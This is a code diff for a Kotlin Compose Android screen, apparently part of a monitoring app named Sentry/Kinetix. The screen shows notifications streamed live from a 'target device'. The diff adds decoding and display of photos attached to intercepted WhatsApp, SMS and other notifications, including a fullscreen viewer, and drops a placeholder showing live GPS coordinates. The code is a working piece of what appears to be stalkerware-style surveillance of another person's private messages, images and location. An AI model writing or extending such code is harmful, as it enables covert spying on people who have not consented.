@@ -1,11 +1,13 @@
 package com.example.kinetix.ui.features
 
+import android.graphics.BitmapFactory
+import android.util.Base64
 import androidx.compose.animation.AnimatedVisibility
 import androidx.compose.animation.core.*
 import androidx.compose.animation.fadeIn
 import androidx.compose.animation.fadeOut
+import androidx.compose.foundation.Image
 import androidx.compose.foundation.background
-import androidx.compose.foundation.border
 import androidx.compose.foundation.clickable
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.lazy.LazyColumn
@@ -25,12 +27,17 @@ import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.draw.clip
 import androidx.compose.ui.graphics.Color
+import androidx.compose.ui.graphics.ImageBitmap
+import androidx.compose.ui.graphics.asImageBitmap
+import androidx.compose.ui.layout.ContentScale
 import androidx.compose.ui.platform.LocalClipboardManager
 import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.text.AnnotatedString
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+import androidx.compose.ui.window.Dialog
+import androidx.compose.ui.window.DialogProperties
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
@@ -44,6 +51,7 @@ data class ModernNotification(
     val packageName: String,
     val title: String,
     val body: String,
+    val imageBase64: String? = null,
     val timeFormatted: String,
     val exactTimeFormatted: String,
     val timestamp: Long,
@@ -62,6 +70,7 @@ fun NotificationsScreen(deviceId: String, onBack: () -> Unit) {
     var selectedFilter by remember { mutableStateOf("All") }
     var isLoading by remember { mutableStateOf(false) }
     var copiedMessage by remember { mutableStateOf<String?>(null) }
+    var previewImageBitmap by remember { mutableStateOf<ImageBitmap?>(null) }
 
     fun formatNotificationTime(timestamp: Long): String {
         if (timestamp <= 0) return "Just now"
@@ -98,6 +107,7 @@ fun NotificationsScreen(deviceId: String, onBack: () -> Unit) {
                         val item = arr.getJSONObject(i)
                         val pkg = item.optString("packageName", "com.example.sentry")
                         val ts = item.optLong("timestamp", System.currentTimeMillis())
+                        val img = item.optString("image", "").ifBlank { null }
 
                         val (friendlyApp, appColor, appBg, appIcon) = when {
                             pkg.contains("whatsapp", ignoreCase = true) -> Quad("WhatsApp", Color(0xFF25D366), Color(0xFFE8F5E9), Icons.AutoMirrored.Filled.Chat)
@@ -125,8 +135,9 @@ fun NotificationsScreen(deviceId: String, onBack: () -> Unit) {
                                 id = "${item.optString("id", "notif_$i")}_$i",
                                 app = friendlyApp,
                                 packageName = pkg,
-                                title = item.optString("title", "Sentry • Kadampukur - Jhalgachi Rd"),
-                                body = item.optString("body", "Live GPS: 22.5726° N, 88.3639° E • Active"),
+                                title = item.optString("title", "Sentry Alert"),
+                                body = item.optString("body", ""),
+                                imageBase64 = img,
                                 timeFormatted = formatNotificationTime(ts),
                                 exactTimeFormatted = formatExactTime(ts),
                                 timestamp = ts,
@@ -137,7 +148,7 @@ fun NotificationsScreen(deviceId: String, onBack: () -> Unit) {
                         )
                     }
 
-                    val distinctList = list.distinctBy { "${it.packageName}|${it.title}|${it.body}" }
+                    val distinctList = list.distinctBy { "${it.packageName}|${it.title}|${it.body}|${it.imageBase64?.take(20) ?: ""}" }
                     withContext(Dispatchers.Main) {
                         notifications.clear()
                         notifications.addAll(distinctList)
@@ -360,7 +371,7 @@ fun NotificationsScreen(deviceId: String, onBack: () -> Unit) {
                         )
                         Spacer(modifier = Modifier.height(8.dp))
                         Text(
-                            "Incoming notifications from the target device will stream here live.",
+                            "Incoming notifications and attached photos from WhatsApp, SMS, and other apps will stream here live.",
                             style = MaterialTheme.typography.bodyMedium,
                             color = Color(0xFF757575),
                             textAlign = androidx.compose.ui.text.style.TextAlign.Center
@@ -525,7 +536,99 @@ fun NotificationsScreen(deviceId: String, onBack: () -> Unit) {
                                         )
                                     }
                                 }
+
+                                // Attached Photo / Media Preview (WhatsApp Photo, MMS, Picture attachments)
+                                if (!notif.imageBase64.isNullOrBlank()) {
+                                    val bitmap = remember(notif.imageBase64) {
+                                        try {
+                                            val bytes = Base64.decode(notif.imageBase64, Base64.DEFAULT)
+                                            BitmapFactory.decodeByteArray(bytes, 0, bytes.size)?.asImageBitmap()
+                                        } catch (_: Exception) {
+                                            null
+                                        }
+                                    }
+
+                                    if (bitmap != null) {
+                                        Spacer(modifier = Modifier.height(10.dp))
+                                        Box(
+                                            modifier = Modifier
+                                                .fillMaxWidth()
+                                                .height(190.dp)
+                                                .clip(RoundedCornerShape(14.dp))
+                                                .background(Color(0xFFF5F5F5))
+                                                .clickable { previewImageBitmap = bitmap }
+                                        ) {
+                                            Image(
+                                                bitmap = bitmap,
+                                                contentDescription = "Notification Attached Image",
+                                                modifier = Modifier.fillMaxSize(),
+                                                contentScale = ContentScale.Crop
+                                            )
+                                            // Tap to view badge
+                                            Surface(
+                                                shape = RoundedCornerShape(8.dp),
+                                                color = Color.Black.copy(alpha = 0.65f),
+                                                modifier = Modifier
+                                                    .align(Alignment.BottomEnd)
+                                                    .padding(8.dp)
+                                            ) {
+                                                Row(
+                                                    modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
+                                                    verticalAlignment = Alignment.CenterVertically
+                                                ) {
+                                                    Icon(Icons.Default.ZoomIn, contentDescription = null, tint = Color.White, modifier = Modifier.size(13.dp))
+                                                    Spacer(modifier = Modifier.width(4.dp))
+                                                    Text("Attached Photo", color = Color.White, fontSize = 10.5.sp, fontWeight = FontWeight.Bold)
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
                             }
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // Fullscreen Attached Photo Preview Dialog
+    if (previewImageBitmap != null) {
+        Dialog(
+            onDismissRequest = { previewImageBitmap = null },
+            properties = DialogProperties(usePlatformDefaultWidth = false)
+        ) {
+            Box(
+                modifier = Modifier
+                    .fillMaxSize()
+                    .background(Color.Black.copy(alpha = 0.95f))
+                    .clickable { previewImageBitmap = null },
+                contentAlignment = Alignment.Center
+            ) {
+                Image(
+                    bitmap = previewImageBitmap!!,
+                    contentDescription = "Fullscreen Attached Photo",
+                    modifier = Modifier
+                        .fillMaxWidth(0.95f)
+                        .fillMaxHeight(0.80f)
+                        .clip(RoundedCornerShape(16.dp)),
+                    contentScale = ContentScale.Fit
+                )
+
+                // Close Button Top-Right
+                IconButton(
+                    onClick = { previewImageBitmap = null },
+                    modifier = Modifier
+                        .align(Alignment.TopEnd)
+                        .padding(24.dp)
+                ) {
+                    Surface(
+                        shape = CircleShape,
+                        color = Color.White.copy(alpha = 0.2f),
+                        modifier = Modifier.size(40.dp)
+                    ) {
+                        Box(contentAlignment = Alignment.Center) {
+                            Icon(Icons.Default.Close, contentDescription = "Close", tint = Color.White)
                         }
                     }
                 }
